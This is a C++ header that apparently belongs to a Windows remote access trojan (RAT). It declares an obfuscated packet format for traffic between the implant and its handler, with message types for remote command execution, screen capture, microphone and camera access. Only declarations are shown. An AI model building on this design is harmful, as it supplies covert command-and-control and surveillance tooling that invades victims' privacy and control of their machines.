#ifndef RAT_SIGNAL
#define RAT_SIGNAL

#include <iostream>
#include <string>
#include <cstring>
#include <iomanip>
#include <sstream>
#include <vector>
#include <chrono>
#include <utility>
#include <thread>

#include <winsock2.h>
#include <ws2tcpip.h>

// custom packet send across a socket to obfuscate
// communication between rat and handler
enum class MsgType { INIT, EXEC, SCREEN, MIC, CAMERA, NONE };
class RatPacket {
public:
    // FRAME FMT : [ 0xde 0xad | SIZE | MSG_TYPE | MSG | 0xbe 0xef ]

    // takes in string content and type and defines elements of the frame
    RatPacket(std::string content, MsgType msgType);
    // extracts elements from given frame after checking if its valid
    RatPacket(const std::string frame);

    // converts the class members into a custom immutable data-frame
    std::string Frame() const;
    // check for valid format
    bool Validate(const std::string& frame) const;
    // print packet data to stdout
    void VisualizePacket();

    // getters
    unsigned int Length() const;
    int SizeOf() const;
    MsgType GetType() const;
    std::string GetPacketMessage() const;

    // setters
    void SetPacketMessage(std::string nMsg);
    void SetType(MsgType nType);
private:
    unsigned int size;
    MsgType type;
    std::string msg;
};

namespace RatPacketUtils {
    std::string ToHex(const std::string& input);
    std::string FromHex(const std::string& hex);
    std::string FormatHex(const std::string& input);

    bool Send(SOCKET& sock, const RatPacket& packet);
};

#endif